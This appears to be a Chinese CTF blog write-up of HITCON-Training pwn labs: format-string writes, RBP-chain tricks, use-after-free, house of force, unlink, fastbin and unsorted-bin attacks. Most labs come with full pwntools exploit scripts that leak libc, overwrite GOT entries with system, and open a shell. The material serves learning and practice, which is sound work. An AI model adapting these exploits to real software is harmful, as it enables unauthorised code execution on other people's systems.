可以对特定参数写入数值，写入的数值大小等于目前已显示的字节数 如 12345%3$n表示对第四个参数指向的位置写入len(“12345”)=5这个数值 虽然很弱智，但这里还是要重点要指明的是，注意是指针指向的位置，而不是物理上的第几个参数位置，例如 0x7fffffffe120是printf的第13个参数，我们的格式化字符串是%8c%12$hhn，把第13个参数处的值修改一字节为8 结果如图 改的不是0x7fffffffe130这个值 stack_off -&amp;gt; pointer -&amp;gt; value 操纵这个指针来修改值 0x5555555547c0 -&amp;gt; 0x555555554708 可以配合%c来做写入 %xxc为打印出xx个字节到屏幕上 %123c%3$n表示对第四个参数写入123这个数值 向指定地址写入特定值 %n写入的大小为4个字节；%ln是8个字节；%hn是2个字节；%hhn是1个字节 一次多个format string拼接时，要注意前面已经打印的字符数 例如第一次写入的是%30c%3$n，对第四个参数写入30。后面继续写的值就要减掉30，假设后续要再对第5个参数写100，我就要写入100-30=70 最后生成的字符串就是%30c%3$n%70c%4$n 好了，回到这道题没有开启PIE要写两种利用，修改magic为0XDA以及修改为0xFACEB00C，分别是写1个字节和写4个字节断在print处，可以看到print的字符串是第8个参数对应的就是%7$验证没错：现在任务就是修改magic为0xda0xffffd11c处填入magic的地址0x804A038，接上格式化字符串%214c%7hhn。 0xda-4=214，减去4是因为写上0x804A038已经有了4个字节。hhn是修改一个字节exp:from pwn import *r = process(&#39;./craxme&#39;)# raw_input()r.recvuntil(&#39;Give me magic :&#39;)magic = 0x804A038p = p32(magic)p += &#39;%214c%7$hhn&#39;r.sendline(p)r.interactive()然后是修改4个字节exp:from pwn import *r = process(&#39;./craxme&#39;)r.recvuntil(&#39;Give me magic :&#39;)magic = 0x804A038 # 0xFACEB00Cp = p32(magic)p += p32(magic+1)p += p32(magic+2)p += p32(magic+3)p += &#39;%252c%7$hhn&#39; # 修改第一个字节,0xc-16+256, 前面有16个字节(4个目标地址)所以要减去16, 0xc-16是负数了，再加上256造成环绕p += &#39;%164c%8$hhn&#39; # 修改第二个字节，0xb0-0xc, 减去0xc是因为前面总共是0xc个字节p += &#39;%30c%9$hhn&#39; # 修改第三个字节，0xce-0xbop += &#39;%44c%10$hhn&#39; # 修改第四个字节，0xfa-0xcer.sendline(p)r.interactive()题目中给的是32位的程序，自己编了个64位的程序，64位程序的利用稍微有点不一样修改一个字节：from pwn import *r = process(&#39;./craxme2&#39;)r.recvuntil(&#39;Give me magic :&#39;)magic = 0x601064# buf刚好在栈顶，也就是printf的第7个参数，但是64位程序中，地址经常不到8字节，就会用null byte，导致截断string。所以64位程序利用时，要把格式化字符串放前面，目标地址放后面。# 这里把目标地址padding到printf的第17个参数，也就是%16$。稍微算下字符串长度就可以知道，先padding到0x50，然后加上目标地址p = (&quot;%&quot; + str(0xda) + &quot;c&quot; + &quot;%16$n&quot;).ljust(0x50, &quot;a&quot;)p += p64(magic)r.sendline(p)r.interactive()修改四个字节from pwn import *r = process(&#39;./craxme2&#39;)raw_input()r.recvuntil(&#39;Give me magic :&#39;)magic = 0x601064 # target: 0xfaceb00cp = &quot;%&quot; + str(0x0c) + &quot;c&quot; + &quot;%16$hhn&quot;p += &quot;%&quot; + str(0xb0 - 0x0c) + &quot;c&quot; + &quot;%17$hhn&quot; # 第二个目标值是0xb0，上一波已经打印的字符数是0x0c，所以这次打印0xb0-0x0c个字符，这样第18个参数处（%17$）的值就是0xb0。# 这里要注意的是，减去上一波的值，这个值指的是已经打印在屏幕上的字符数，所以是0x0c，而不是p这个字符串的长度，意思就是&quot;%16$hhn&quot;这一段是不计算在内的。显然这是废话，但是还是写一下。。p += &quot;%&quot; + str(0xce - 0xb0) + &quot;c&quot; + &quot;%18$hhn&quot;p += &quot;%&quot; + str(0xfa - 0xce) + &quot;c&quot; + &quot;%19$hhn&quot;p = p.ljust(0x50, &quot;a&quot;)p += p64(magic)p += p64(magic+1)p += p64(magic+2)p += p64(magic+3)r.sendline(p)r.interactive()lab9 格式化字符串buf 不在stack时怎么办？trick1: RBP Chain首先：该trick的本质还是利用格式化字符串，把地址写到stack上（只是这个写地址的过程 比较心酸。。。），其实和上面的是一样的。 假设现在有个format string的漏洞，在main function下两层的function中 main -&amp;gt; func1 -&amp;gt; func2 -&amp;gt; printf (不是必须要ebp链，举这个例子只是因为比较好理解，只要能一些可控的指针链就行) 利用func2’s stack frame（简称第二层，其他类比）中的rbp来控制第一层的rbp这个pointer，再利用第一层的rbp来写值 图解：trick2: Argv Chain做法和rbp chain类似，不过argv利用的是main function传递的argv来控制指针&amp;amp;argv -&amp;gt; argv -&amp;gt; argv[0]但是要注意argv[0]每次offset都不固定，需要先leak来确认参数位置回到这到题目：gdb断在printf处，关键的几个ebp位置stack排布如图所示思路就很清晰了，先操控arg7，把arg11加4字节，让第一层的ebp指向__libc_start_main+241那一格，也就是main函数那层的return address。然后一直一字节一字节的写，把return address改成rop chain。 记得把第一层的ebp再改回来，改成原来的ebp，不然main函数的stack frame就无法复原了这个exp还贼难写，写了一大堆，发现最后寄了！！！这寄吧main函数的leave &amp;amp; ret 中间怎么还有条lea esp, [ecx-4] !!! 寄！ROP是行不通了，换个路子 不过想想，相救应该还是能就救回来的，不就这几行操作吗 .text:080485B3 mov ecx, [ebp-4].text:080485B6 leave.text:080485B7 lea esp, [ecx-4].text:080485BA retn 在rop的时候再调整下栈帧，应该也行的。但是还是算了，换个方法保平安虚假的exp#encoding=UTF-8from pwn import *r = process(&#39;./playfmt&#39;)libc = ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)context.log_level=&#39;debug&#39;context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]raw_input()# context.log_level=&#39;debug&#39;r.recvuntil(&#39;Magic echo Server\\n=====================&#39;)r.sendline(&quot;#%15$p#&quot;)r.recvuntil(&#39;#&#39;)libc_start_main_addr = int(r.recv(10), 16) - 241libc_start_main_off = libc.symbols[&#39;__libc_start_main&#39;]libc_addr = libc_start_main_addr - libc_start_main_offlog.success(&#39;libc addr ===&amp;gt; {}&#39;.format(hex(libc_addr)))system_addr = libc_addr+ libc.symbols[&#39;system&#39;]bin_sh_addr = libc_addr + libc.search(&#39;/bin/sh&#39;).next()#得先leak出第一层ebp的值r.sendline(&quot;aaaa%10$p&quot;)r.recvuntil(&#39;aaaa&#39;)ebp1 = int(r.recvline()[:-1], 16)log.success(&quot;ebp1 point to ===&amp;gt; {}&quot;.format(hex(ebp1)))num = ebp1 &amp;amp; 0xff # 第一层ebp指向下一格p = &quot;%&quot; + str(num+0x4) + &quot;c&quot; + &quot;%6$hhn&quot;r.sendline(p)r.recvline()#用第一层的ebp写值#写system system = 0xf7e193d0p = &quot;%&quot; + str(0xd0) + &quot;c&quot; + &quot;%10$hhn&quot;r.sendline(p)r.recvline()p = &quot;%&quot; + str(num+0x5) + &quot;c&quot; + &quot;%6$hhn&quot;r.sendline(p)r.recvline()p = &quot;%&quot; + str(0x93) + &quot;c&quot; + &quot;%10$hhn&quot;r.sendline(p)r.recvline()p = &quot;%&quot; + str(num+0x6) + &quot;c&quot; + &quot;%6$hhn&quot;r.sendline(p)r.recvline()p = &quot;%&quot; + str(0xe1) + &quot;c&quot; + &quot;%10$hhn&quot;r.sendline(p)r.recvline()# 因为缓冲区没有清空，导致IO 乱的一比，下面数据全部加上后缀，接受到后缀后再发送新的数据p = &quot;%&quot; + str(num+0x7) + &quot;c&quot; + &quot;%6$hhnqwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)p = &quot;%&quot; + str(0xf7) + &quot;c&quot; + &quot;%10$hhnqwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)log.success(&#39;system write done!!!!&#39;)# 第一层ebp指向下一格p = &quot;%&quot; + str(num+0x8) + &quot;c&quot; + &quot;%6$hhnqwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)#用第一层的ebp写值#随便写，写个0001p = &quot;%&quot; + str(1) + &quot;c&quot; + &quot;%10$nqwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)pause()# 第一层ebp指向下一格p = &quot;%&quot; + str(num+0x4*3) + &quot;c&quot; + &quot;%6$hhnqwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)#用第一层的ebp写值#写/bin/sh bin_sh = 0xf7f5a1dbp = &quot;%&quot; + str(0xdb) + &quot;c&quot; + &quot;%10$hhnqwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)p = &quot;%&quot; + str(num+0x4*3+1) + &quot;c&quot; + &quot;%6$hhnqwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)p = &quot;%&quot; + str(0xa1) + &quot;c&quot; + &quot;%10$hhnqwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)p = &quot;%&quot; + str(num+0x4*3+2) + &quot;c&quot; + &quot;%6$hhnqwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)p = &quot;%&quot; + str(0xf5) + &quot;c&quot; + &quot;%10$hhnqwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)p = &quot;%&quot; + str(num+0x4*3+3) + &quot;c&quot; + &quot;%6$hhnqwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)p = &quot;%&quot; + str(0xf7) + &quot;c&quot; + &quot;%10$hhnqwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)log.success(&#39;/bin/sh write done!!!&#39;)#把第一层ebp改回来p = &quot;%&quot; + str(num) + &quot;c&quot; + &quot;%6$hhnqwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)r.sendline(&#39;quit&#39;)r.interactive() 虽然上面的方法是失败了，但是还是学到了东西 1、printf在处理格式化字符串时，取地址的操作是一次性完成的，而不是一边改一边写。什么意思呢。比如我一开始是想把payload字符串一次性写好的，指针动一字节，写一字节，再动一字节，再写一字节。然后调试的时候发现根本不会动，笑死，一直在原地写。所以实际操作的时候只能先发送动一字节的payload，然后再发送写一字节的payload，这样子得分开着发。 2、IO很乱的时候，试着加上前缀或者后缀，可以有效的控制IO符合原本的预期 3、写ROP前，特么的先看下function epilogue的汇编实现，别ROP整到最后，栈帧都已经安排的明明白白了，一行调整栈顶的操作导致前功尽弃。改printf的got吧思路1如图但是实际跑的时候发现，IO还是顶不住。。看来这个方法的效率还是太低了，要打印太多次字符再再再换个方法尝试利用这两条链 0xffffd1ec —▸ 0x804857c (play+51) 0xffffd1f0 —▸ 0x8048645 为什么选这俩呢，是因为高2位和printf_got是一样的，可以少一次打印一堆字符再用hn写进去思路如图：调试过程图记录一下：exp:#encoding=UTF-8from pwn import *r = process(&#39;./playfmt&#39;)elf = ELF(&#39;./playfmt&#39;)libc = ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)context.log_level=&#39;debug&#39;context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]def debug(): gdb.attach(r, &#39;b *0x804853B&#39;) pause()r.recvuntil(&#39;Magic echo Server\\n=====================&#39;)r.sendline(&quot;#%15$p#&quot;)r.recvuntil(&#39;#&#39;)libc_start_main_addr = int(r.recv(10), 16) - 241libc_start_main_off = libc.symbols[&#39;__libc_start_main&#39;]libc_addr = libc_start_main_addr - libc_start_main_offlog.success(&#39;libc addr ===&amp;gt; {}&#39;.format(hex(libc_addr)))system_addr = libc_addr+ libc.symbols[&#39;system&#39;]printf_got = elf.got[&#39;printf&#39;]# leak出arg4和arg5的地址r.sendline(&#39;qwer%6$p#&#39;)r.recvuntil(&#39;qwer&#39;)ebp = int(r.recvuntil(&#39;#&#39;)[:-1], 16)arg4 = ebp-28arg5 = ebp-24log.success(&#39;arg4 addr ===&amp;gt; {:x}&#39;.format(arg4))log.success(&#39;arg5 addr ===&amp;gt; {:x}&#39;.format(arg5))# leak出arg22和arg23的值r.sendline(&quot;qwer%21$p#%22$p#&quot;)r.recvuntil(&#39;qwer&#39;)arg22 = int(r.recvuntil(&#39;#&#39;)[:-1], 16)arg23 = int(r.recvuntil(&#39;#&#39;)[:-1], 16)log.success(&#39;arg22 point to ===&amp;gt; {:x}&#39;.format(arg22))log.success(&#39;arg23 point to ===&amp;gt; {:x}&#39;.format(arg23))p = &#39;%&#39; + str(arg4 &amp;amp; 0xffff) + &#39;c&#39; + &#39;%21$hn&#39; + &#39;aaaa&#39; + &#39;%22$hnqwer&#39;r.sendline(p)r.recvuntil(&#39;qwer&#39;)# pause()# 修改arg4和arg5的值，创造出printf_got和printf_got+2 这俩指针low = printf_got &amp;amp; 0xffffp = &#39;%&#39; + str(low) + &#39;c&#39; + &#39;%57$hn&#39; + &#39;aa&#39; + &#39;%59$hnqwer&#39;r.sendline(p)r.recvuntil(&#39;qwer&#39;)# pause()# debug()#向printf_got中写入systemlow = system_addr &amp;amp; 0xffffhigh = system_addr &amp;gt;&amp;gt; 16p = &#39;%&#39; + str(low) + &#39;c&#39; + &#39;%3$hn&#39; + &#39;%&#39; + str(high-low) + &#39;c&#39; + &#39;%4$hnqwer&#39;r.sendline(p)r.recvuntil(&#39;qwer&#39;)r.sendline(&#39;/bin/sh\\x00&#39;)r.interactive()&#39;&#39;&#39;# 因为IO流爆了，调试了半天不太行#写printf_gotlow = printf_got &amp;amp; 0xffffhigh = printf_got &amp;gt;&amp;gt; 16p = &quot;%&quot; + str(low) + &quot;c&quot; + &quot;%10$hn qwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)p = &quot;%&quot; + str(num + 2) + &quot;c&quot; + &quot;%6$hhn qwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)p = &quot;%&quot; + str(high) + &quot;c&quot; + &quot;%10$hn qwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)#向printf_got中写systemlow = system_addr &amp;amp; 0xffffhigh = system_addr &amp;gt;&amp;gt; 16p = &quot;%&quot; + str(low) + &quot;c&quot; + &quot;%14$hn qwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)print(&#39;system的低2字节已经写入&#39;)print(&#39;ebp1重新指回&#39;)p = &quot;%&quot; + str(num) + &quot;c&quot; + &quot;%6$hhn qwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)print(&#39;指向printf_got的高2字节&#39;)p = &quot;%&quot; + str((printf_got &amp;amp; 0xff) + 2) + &quot;c&quot; + &quot;%10$hhn qwer&quot; # 关键，把指针指向printf_got的高2字节，然后继续写入system的高2字节r.sendline(p)r.recvuntil(&#39;qwer&#39;)#写system的高2字节p = &quot;%&quot; + str(high) + &quot;c&quot; + &quot;%14$hn qwer&quot;r.sendline(p)r.recvuntil(&#39;qwer&#39;)&#39;&#39;&#39;lab10 考点 UAF开始进入heap exploitationadd note结构漏洞点：UAF把print_note_context指针改成magic即可利用：创建note-context-note-context：0x10-0x28-0x10-0x28的堆排布，free(note1) , free(note0), 于是0x10的fastbin中有两个chunk，然后再次创建一个note时，使得该note的context与note0 overlap， 就可以修改note0的print_note_context指针exp:from pwn import *r = process(&#39;./hacknote&#39;)elf = ELF(&#39;./hacknote&#39;)context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]def debug(): gdb.attach(r) pause()def add_note(size, con): r.recvuntil(&#39;Your choice :&#39;) r.sendline(str(1)) r.recvuntil(&#39;Note size :&#39;) r.sendline(str(size)) r.recvuntil(&#39;Content :&#39;) r.sendline(con)def delete_note(index): r.recvuntil(&#39;Your choice :&#39;) r.sendline(str(2)) r.recvuntil(&#39;Index :&#39;) r.sendline(str(index))def print_note(index): r.recvuntil(&#39;Your choice :&#39;) r.sendline(str(3)) r.recvuntil(&#39;Index :&#39;) r.sendline(str(index))add_note(0x20, &#39;aaaa&#39;) #0add_note(0x20, &#39;bbbb&#39;) #1delete_note(0)delete_note(1)magic = 0x8048986add_note(0x10, p64(elf.symbols[&#39;magic&#39;]))print_note(0)r.interactive()lab11-1 考点：house of force这一块逻辑逆向来看有点乱，动态调试后一目了然一个全局的itemlist，按照size, chunk_addr的顺序存放change_item有个越界写漏洞利用：利用越界写，改掉top chunk的size，改成0xffffffffffffffffnb=0x603000-0x603050-16=-80-16=-96，所以malloc(-96)之后top chunk就会被搬到0x603000处。然后再malloc一个0x10大小的chunk，就可以改掉0x603010和0x603018处的两个指针 把goodbye_message改成magicexp:from pwn import *r = process(&#39;./bamboobox&#39;)elf = ELF(&#39;./bamboobox&#39;)context.log_level=&#39;debug&#39;context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]def debug(): gdb.attach(r) pause() def add(size, name): r.recvuntil(&#39;Your choice:&#39;) r.sendline(&#39;2&#39;) r.recvuntil(&#39;Please enter the length of item name:&#39;) r.sendline(str(size)) r.recvuntil(&#39;Please enter the name of item:&#39;) r.sendline(name)def show(): r.recvuntil(&#39;Your choice:&#39;) r.sendline(&#39;1&#39;)def change(index, size, name): r.recvuntil(&#39;Your choice:&#39;) r.sendline(&#39;3&#39;) r.recvuntil(&#39;Please enter the index of item:&#39;) r.sendline(str(index)) r.recvuntil(&#39;Please enter the length of item name:&#39;) r.sendline(str(size)) r.recvuntil(&#39;Please enter the new name of the item:&#39;) r.sendline(name)def remove(index): r.recvuntil(&#39;Your choice:&#39;) r.sendline(&#39;4&#39;) r.recvuntil(&#39;lease enter the index of item:&#39;) r.sendline(str(index))def my_exit(): r.recvuntil(&#39;Your choice:&#39;) r.sendline(&#39;5&#39;)add(0x20, &#39;aaaa&#39;) # 0p = &#39;a&#39;*0x20 + p64(0) + p64(0xffffffffffffffff)change(0, 0x30, p)add(-96, &#39;bbbb&#39;)add(0x10, &#39;a&#39;*8+p64(elf.symbols[&#39;magic&#39;]))my_exit()r.interactive()lab11-2 考点： unlinkadd两次(要free的chunk 大小要超过fastbin大小，因为fastbin的P位一定是1，不会触发unlink。我下面有些图两个chunk都是0x40大小的，所有没有触发unlink，图也懒得改了，只要把0x40改成0x90即可)触发越界写，达成unlink利用的条件，并触发unlink因为itemlist中的指针指向的是chunk data部分，所以在越界写的时候要伪造出整个chunk，而不单单是fd和bk。如果只伪造fd和bk，结果是这样的FD=P-&amp;gt;fd=0x602090BK=P-&amp;gt;bk=0x602098unlink时check: FD-&amp;gt;bk = *(0x602090+0x18) = *(0x6020a8) = 0x603030 并不等于P(0x603020)所以越界写思路如图：free并触发unlink：exp:#encoding=UTF-8from pwn import *r = process(&#39;./bamboobox&#39;)elf = ELF(&#39;./bamboobox&#39;)context.log_level=&#39;debug&#39;context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]def debug(cmd=&#39;&#39;): gdb.attach(r,cmd) pause() def add(size, name): r.recvuntil(&#39;Your choice:&#39;) r.sendline(&#39;2&#39;) r.recvuntil(&#39;Please enter the length of item name:&#39;) r.sendline(str(size)) r.recvuntil(&#39;Please enter the name of item:&#39;) r.sendline(name)def show(): r.recvuntil(&#39;Your choice:&#39;) r.sendline(&#39;1&#39;)def change(index, size, name): r.recvuntil(&#39;Your choice:&#39;) r.sendline(&#39;3&#39;) r.recvuntil(&#39;Please enter the index of item:&#39;) r.sendline(str(index)) r.recvuntil(&#39;Please enter the length of item name:&#39;) r.sendline(str(size)) r.recvuntil(&#39;Please enter the new name of the item:&#39;) r.sendline(name)def remove(index): r.recvuntil(&#39;Your choice:&#39;) r.sendline(&#39;4&#39;) r.recvuntil(&#39;lease enter the index of item:&#39;) r.sendline(str(index))def my_exit(): r.recvuntil(&#39;Your choice:&#39;) r.sendline(&#39;5&#39;)add(0x30, &#39;aaaa&#39;) #0add(0x80, &#39;bbbb&#39;) #1ptr = elf.symbols[&#39;itemlist&#39;] + 8p = p64(0) # fake prev_sizep += p64(0x31) # fake sizep += p64(ptr-0x18) # fake fdp += p64(ptr-0x10) # fake bkp += &#39;a&#39;*0x10p += p64(0x30) # fake prev_sizep += p64(0x90) # fake sizechange(0, 0x40, p)remove(1)p = p64(0)*2 + p64(0x40) + p64(elf.got[&#39;atoi&#39;])change(0, 0x20, p)# method1: call magic#change(0, 0x8, p64(elf.symbols[&#39;magic&#39;]))# method2： get shellshow()r.recvuntil(&#39;0 : &#39;)atoi_addr = u64(r.recvuntil(&#39;\\xff\\x7f&#39;).ljust(8, &#39;\\x00&#39;))atoi_off = 0x36e90libc_addr = atoi_addr - atoi_offsystem_off = 0x453a0system_addr = libc_addr + system_offchange(0, 0x8, p64(system_addr))r.recvuntil(&quot;:&quot;)r.sendline(&#39;/bin/sh&#39;)r.interactive() 题外话，一开始我修改了下源码 导致调试一直通不过 就永远卡在这里了。。 不知道是啥原因，至今没有解决 倒是改atoi_got换成了改exit_got可以 反正改atoi_got不知道为啥不行lab12 考点：fastbin attack漏洞点：改puts的got，这题改free的got会有点问题，调试时发现的还有，如果你拿pwndbg的find_fake_fast命令找的话，是找不到的，它代码写的有问题（盲猜是因为它做了8字节校验？）但是其实做fastbin的fake chunk只需要四字节满足要求就可以实际上是一个unsigned int，也就是说在x64上（假设此时idx为0x20），我们的size的高位不是全要为零，而是0x????????00000020 + [0,7]，高4字节是可以任意的。比如0xffffffff00000023就是可以的。 给pwndbg修了一下，可以正常显示了 exp: 针对这题 拿个flag就比较简便from pwn import *r = process(&#39;./secretgarden&#39;)elf = ELF(&#39;./secretgarden&#39;)context.log_level=&#39;debug&#39;context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]def debug(cmd=&#39;&#39;): gdb.attach(r, cmd) pause()def raise_flower(length, name, color): r.recvuntil(&quot;Your choice :&quot;) r.sendline(&#39;1&#39;) r.recvuntil(&#39;Length of the name :&#39;) r.sendline(str(length)) r.recvuntil(&#39;The name of flower :&#39;) r.sendline(name) r.recvuntil(&#39;The color of the flower :&#39;) r.sendline(color)def visit(): r.recvuntil(&quot;Your choice :&quot;) r.sendline(&#39;2&#39;)def remove(index): r.recvuntil(&quot;Your choice :&quot;) r.sendline(&#39;3&#39;) r.recvuntil(&#39;Which flower do you want to remove from the garden:&#39;) r.sendline(str(index))def clean(): r.recvuntil(&quot;Your choice :&quot;) r.sendline(&#39;4&#39;)def leave(): r.recvuntil(&quot;Your choice :&quot;) r.sendline(&#39;5&#39;)raise_flower(0x50, &#39;aaaa&#39;, &#39;1&#39;) #0raise_flower(0x50, &#39;bbbb&#39;, &#39;2&#39;) #1remove(0)remove(1)remove(0)fake_chunk_addr = 0x601ffaraise_flower(0x50, p64(fake_chunk_addr), &#39;3&#39;) #2raise_flower(0x50, &#39;cccc&#39;, &#39;4&#39;) #3raise_flower(0x50, &#39;dddd&#39;, &#39;5&#39;) #4p = &#39;a&#39;*22 + p64(elf.symbols[&#39;magic&#39;])debug()raise_flower(0x50, p, &#39;6&#39;) #5r.interactive()拿shell，麻烦点，还要leak libc关键点：用unsorted_bin leak libc#encoding=UTF-8from pwn import *r = process(&#39;./secretgarden&#39;)elf = ELF(&#39;./secretgarden&#39;)context.log_level=&#39;debug&#39;context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]def debug(cmd=&#39;&#39;): gdb.attach(r, cmd) pause()def raise_flower(length, name, color): r.recvuntil(&quot;Your choice :&quot;) r.sendline(&#39;1&#39;) r.recvuntil(&#39;Length of the name :&#39;) r.sendline(str(length)) r.recvuntil(&#39;The name of flower :&#39;) r.send(name) r.recvuntil(&#39;The color of the flower :&#39;) r.sendline(color)def visit(): r.recvuntil(&quot;Your choice :&quot;) r.sendline(&#39;2&#39;)def remove(index): r.recvuntil(&quot;Your choice :&quot;) r.sendline(&#39;3&#39;) r.recvuntil(&#39;Which flower do you want to remove from the garden:&#39;) r.sendline(str(index))def clean(): r.recvuntil(&quot;Your choice :&quot;) r.sendline(&#39;4&#39;)def leave(): r.recvuntil(&quot;Your choice :&quot;) r.sendline(&#39;5&#39;)# leak libcraise_flower(0x80, &#39;aaaa&#39;, &#39;0&#39;) #0raise_flower(0x40, &#39;bbbb&#39;, &#39;1&#39;) #1remove(0)clean()raise_flower(0x80, &#39;c&#39;*8, &#39;2&#39;) #2 8个字节填满第一格，打印的时候顺带着把第二格的bk打印出来。malloc时不会把chunk内容清空，这个bk就是这个chunk作为unsorted bin时的bk。 再然后，注意要用send发送，不要用sendline，sendline会多一个\\n，会覆盖bk一字节visit()r.recvuntil(&#39;c&#39;*8)libc_addr = u64(r.recvuntil(&#39;\\xff\\x7f&#39;).ljust(8, &#39;\\x00&#39;)) - 0x3c4b78 # 0x3c4b78 = main_arena+88 - libc_base，偏移是固定的，gdb里算一下log.success(&#39;libc_addr =====&amp;gt; {:x}&#39;.format(libc_addr))# fastbin dupraise_flower(0x60, &#39;dddd&#39;, &#39;3&#39;) #3raise_flower(0x60, &#39;eeee&#39;, &#39;4&#39;) #4raise_flower(0x60, &#39;ffff&#39;, &#39;5&#39;) #5remove(3)remove(4)remove(3)fake_chunk_addr = libc_addr + 0x3c4b10 - 0x23 # __malloc_hookraise_flower(0x60, p64(fake_chunk_addr), &#39;6&#39;) #6raise_flower(0x60, &#39;gggg&#39;, &#39;4&#39;) #7raise_flower(0x60, &#39;hhhh&#39;, &#39;5&#39;) #8p = &#39;a&#39;*19 + p64(libc_addr + 0x4527a) # one_gadget 恰好可以，不行的话就malloc_hook + __realloc_hook + one_gadget# debug()raise_flower(0x60, p, &#39;6&#39;) #9r.recvuntil(&#39;Your choice :&#39;)r.sendline(&#39;1&#39;)r.interactive()lab13 考点：Extend the chunk漏洞点off-by-oneexp:from pwn import *r = process(&#39;./heapcreator&#39;)elf = ELF(&#39;./heapcreator&#39;)context.log_level=&#39;debug&#39;context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]def debug(cmd=&#39;&#39;): gdb.attach(r, cmd) pause()def create(size, context): r.recvuntil(&#39;Your choice :&#39;) r.sendline(&#39;1&#39;) r.recvuntil(&#39;Size of Heap :&#39;) r.sendline(str(size)) r.recvuntil(&#39;Content of heap:&#39;) r.sendline(context)def edit(index, context): r.recvuntil(&#39;Your choice :&#39;) r.sendline(&#39;2&#39;) r.recvuntil(&#39;Index :&#39;) r.sendline(str(index)) r.recvuntil(&#39;Content of heap :&#39;) r.sendline(context)def show(index): r.recvuntil(&#39;Your choice :&#39;) r.sendline(&#39;3&#39;) r.recvuntil(&#39;Index :&#39;) r.sendline(str(index)) def delete(index): r.recvuntil(&#39;Your choice :&#39;) r.sendline(&#39;4&#39;) r.recvuntil(&#39;Index :&#39;) r.sendline(str(index)) create(0x28, &#39;a&#39;*0x28) #0create(0x10, &#39;b&#39;*0x10) #1# off-by-oneedit(0, &#39;a&#39;*0x28+&#39;\\x41&#39;)delete(1)# overlap chunk, write atoi_gotp = &#39;a&#39;*16 + p64(0) + p64(0x31) + p64(0x30) + p64(elf.got[&#39;atoi&#39;]) create(0x30, p) #1# leak libcshow(1) r.recvuntil(&#39;Content : &#39;)libc_addr = u64(r.recv(6).ljust(8, &#39;\\x00&#39;)) - 0x36e90 # 0x36e90=atoi_offlog.success(&#39;libc_addr ======&amp;gt; {:x}&#39;.format(libc_addr))system_addr = libc_addr + 0x453a0# overwrite atoi_gotedit(1, p64(system_addr))r.recvuntil(&#39;Your choice :&#39;)r.sendline(&#39;sh&#39;)# r.sendline(&#39;$0&#39;) # 新学到的姿势r.interactive()lab14 考察unsorted bin attack unsorted bin attack的关键是把unsorted bin 的最后一个chunk(最先放进的)的bk改为target-0x10 使得target处的值变得很大 在做unsorted bin attack的时候虽然我们的目的是改bk，但是其实fd改掉了也没有影响，在unlink的时候fd没有用到。 但是这样unsortedbin 会坏掉漏洞点：越界写这道题就用unsorted bin attack，把magic改为unsorted bin ，一个很大的数字exp:from pwn import *r = process(&#39;./magicheap&#39;)context.log_level=&#39;debug&#39;context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]def debug(cmd=&#39;&#39;): gdb.attach(r, cmd) pause()def create(size, context): r.recvuntil(&#39;Your choice :&#39;) r.sendline(&#39;1&#39;) r.recvuntil(&#39;Size of Heap :&#39;) r.sendline(str(size)) r.recvuntil(&#39;Content of heap:&#39;) r.sendline(context)def edit(index, size, context): r.recvuntil(&#39;Your choice :&#39;) r.sendline(&#39;2&#39;) r.recvuntil(&#39;Index :&#39;) r.sendline(str(index)) r.recvuntil(&#39;Size of Heap :&#39;) r.sendline(str(size)) r.recvuntil(&#39;Content of heap :&#39;) r.sendline(context)def delete(index): r.recvuntil(&#39;Your choice :&#39;) r.sendline(&#39;3&#39;) r.recvuntil(&#39;Index :&#39;) r.sendline(str(index))create(0x80, &#39;a&#39;) #0create(0x30, &#39;b&#39;) #1 overflowcreate(0x80, &#39;c&#39;) #2create(0x30, &#39;b&#39;) #3 avoid merge to topdelete(2)delete(0)magic = 0x6020C0p = &#39;a&#39;*0x30 + p64(0) + p64(0x91) + p64(0) + p64(magic - 0x10)edit(1, 0x50, p)create(0x80, &#39;e&#39;) #0r.recvuntil(&#39;Your choice :&#39;)r.sendline(&#39;4869&#39;)r.interactive()lab15C++ pwn以后写参考链接链接：https://github.com/scwuaptx/HITCON-Training配套的学习视频：https://www.youtube.com/user/scwuaptx/videos" }, { "title": "heap利用方式总结", "url": "/posts/heap%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/", "categories": "CTF, pwn", "tags": "CTF, pwn", "date": "2022-05-25 23:05:00 +0800", "snippet": "0x00 malloc workflow流程详细版0x01 fastbin_dup利用条件程序存在double free漏洞目的 fastbin array使用单链表实现，free的时候会对free-list进行检查，所以我们不能free同一个chunk两次。但是可以在两次free之间增加一次对其他chunk的free，从而绕过检查顺利执行，然后malloc三次，就得到了两个指向同一区域的指针步骤 a = malloc(8) = 0x602010 b = malloc(8) = 0x602030 c = malloc(8) = 0x602050 free(a) free(b) free(a) d = malloc(8) = 0x602010 e = malloc(8) = 